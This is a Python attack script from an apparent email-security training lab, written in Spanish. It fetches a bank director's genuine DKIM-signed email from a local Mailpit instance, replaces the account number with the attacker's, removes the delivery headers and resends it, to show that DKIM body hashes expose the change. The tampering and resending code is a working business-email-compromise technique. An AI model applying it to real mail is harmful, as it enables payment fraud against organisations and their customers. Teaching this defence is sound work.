"""A3 — Correo legítimo alterado: el atacante consigue un correo real del director
(firmado con DKIM por bancoseguro.test), cambia el número de cuenta en el cuerpo y lo
reenvía tal cual, con la firma original.

Sin DKIM, nadie notaría el cambio. Con DKIM, el hash del cuerpo (bh=) ya no coincide.

En el laboratorio, "conseguir el correo" = leer el último legítimo de la API de Mailpit.
En la vida real: una cuenta comprometida, un destinatario cómplice o un reenvío.

Uso dentro del contenedor:  python3 -m ataques.a3_legitimo_alterado [--para X] [--servidor Y]
"""

from __future__ import annotations

import argparse
import base64
import json
import quopri
import re
import sys
from urllib.parse import quote
from urllib.request import urlopen

from ataques.comun import (
    ALLOWED_SERVER,
    ATTACKER_ACCOUNT,
    DEFAULT_RECIPIENT,
    Attack,
    AttackError,
    AttackResult,
    DestinationError,
    send_raw,
    validate_destination,
)

ATTACK = Attack(
    id="A3",
    description="Correo legítimo alterado",
    envelope_from="director@bancoseguro.test",
    header_from="director@bancoseguro.test",
    dkim="la original del banco (d=bancoseguro.test), con el cuerpo modificado",
)

MAILPIT_API = "http://mailpit:8025/api/v1"
ACCOUNT = re.compile(rb"\b\d{4}-\d{4}-\d{2}\b")
# Cabeceras que agregó el receptor al entregarlo: se quitan, como haría un reenvío.
TRACE_HEADERS = re.compile(
    rb"^(Return-Path|Received|Authentication-Results|Delivered-To|X-Spam[\w-]*|X-Rspamd[\w-]*):",
    re.IGNORECASE,
)


def _get(path: str) -> bytes:
    with urlopen(f"{MAILPIT_API}{path}", timeout=10) as resp:
        return resp.read()


def _split(raw: bytes) -> tuple[list[bytes], bytes, bytes]:
    """(cabeceras desplegadas como líneas, separador, cuerpo)."""
    for sep in (b"\r\n\r\n", b"\n\n"):
        if sep in raw:
            head, body = raw.split(sep, 1)
            eol = sep[: len(sep) // 2]
            return head.split(eol), eol, body
    raise AttackError("El correo original no tiene el formato esperado.")


def _header_blocks(lines: list[bytes]) -> list[list[bytes]]:
    """Agrupa cada cabecera con sus líneas de continuación."""
    blocks: list[list[bytes]] = []
    for line in lines:
        if line[:1] in (b" ", b"\t") and blocks:
            blocks[-1].append(line)
        else:
            blocks.append([line])
    return blocks


def _header(blocks: list[list[bytes]], name: bytes) -> bytes:
    for block in blocks:
        if block[0].lower().startswith(name.lower() + b":"):
            return b" ".join(part.strip() for part in block).split(b":", 1)[1].strip()
    return b""


def _is_signed_by_bank(blocks: list[list[bytes]]) -> bool:
    signature = _header(blocks, b"DKIM-Signature")
    return re.search(rb"\bd=bancoseguro\.test\b", signature) is not None


def _decode_body(body: bytes, cte: bytes) -> bytes:
    cte = cte.lower()
    if cte == b"quoted-printable":
        return quopri.decodestring(body)
    if cte == b"base64":
        return base64.b64decode(body)
    return body


def _encode_body(body: bytes, cte: bytes, eol: bytes) -> bytes:
    cte = cte.lower()
    if cte == b"quoted-printable":
        encoded = quopri.encodestring(body.replace(b"\r\n", b"\n"))
    elif cte == b"base64":
        encoded = base64.encodebytes(body)
    else:
        return body
    return encoded.replace(b"\n", eol)


def find_original() -> tuple[bytes, bool]:
    """Último correo legítimo del director: (raw, ¿firmado por el banco?).

    Prefiere uno firmado con DKIM; si no hay, usa uno sin firmar (escenarios 0 y 1).
    Descarta los que ya traen la cuenta del atacante (otros ataques o copias de A3).
    """
    query = quote('from:"director@bancoseguro.test"')
    found = json.loads(_get(f"/search?query={query}&limit=50"))["messages"]
    unsigned: bytes | None = None
    for summary in found:  # Mailpit devuelve primero los más recientes
        raw = _get(f"/message/{summary['ID']}/raw")
        lines, _, body = _split(raw)
        blocks = _header_blocks(lines)
        cte = _header(blocks, b"Content-Transfer-Encoding")
        if ATTACKER_ACCOUNT.encode() in _decode_body(body, cte):
            continue
        if _is_signed_by_bank(blocks):
            return raw, True
        unsigned = unsigned or raw
    if unsigned is None:
        raise AttackError(
            "No hay ningún correo legítimo del director en Mailpit para alterar. "
            "Primero envía uno con: ./lab.sh enviar legit"
        )
    return unsigned, False


def tamper(raw: bytes) -> tuple[bytes, str, str]:
    """Cambia la cuenta del cuerpo y quita las cabeceras de entrega.

    Devuelve (mensaje alterado, Message-ID, From). Las demás cabeceras, incluida la
    firma DKIM original, quedan intactas.
    """
    lines, eol, body = _split(raw)
    blocks = [b for b in _header_blocks(lines) if not TRACE_HEADERS.match(b[0])]
    cte = _header(blocks, b"Content-Transfer-Encoding")
    decoded = _decode_body(body, cte)
    altered, changes = ACCOUNT.subn(ATTACKER_ACCOUNT.encode(), decoded)
    if not changes:
        raise AttackError("El correo original no contiene un número de cuenta que cambiar.")
    new_head = eol.join(line for block in blocks for line in block)
    message_id = _header(blocks, b"Message-ID").decode().strip("<>")
    header_from = _header(blocks, b"From").decode()
    return new_head + eol + eol + _encode_body(altered, cte, eol), message_id, header_from


def launch(recipient: str = DEFAULT_RECIPIENT, server: str = ALLOWED_SERVER) -> AttackResult:
    validate_destination(recipient, server)
    original, signed = find_original()
    raw, message_id, header_from = tamper(original)
    note = (
        "Usé el último correo legítimo firmado por bancoseguro.test y cambié la cuenta."
        if signed
        else "No hay correos legítimos firmados: usé uno sin firma y cambié la cuenta."
    )
    attack = Attack(ATTACK.id, ATTACK.description, ATTACK.envelope_from, header_from, ATTACK.dkim)
    return send_raw(attack, raw, message_id, recipient, server, note=note)


def main() -> int:
    parser = argparse.ArgumentParser(description=f"{ATTACK.id}: {ATTACK.description}")
    parser.add_argument("--para", default=DEFAULT_RECIPIENT, help="destinatario (.test)")
    parser.add_argument("--servidor", default=ALLOWED_SERVER, help="servidor SMTP (receptor)")
    args = parser.parse_args()
    try:
        result = launch(args.para, args.servidor)
    except (DestinationError, AttackError) as error:
        print(f"ABORTADO: {error}", file=sys.stderr)
        return 2
    print(result.note)
    print(result.transcript)
    return 0 if result.accepted else 1


if __name__ == "__main__":
    sys.exit(main())
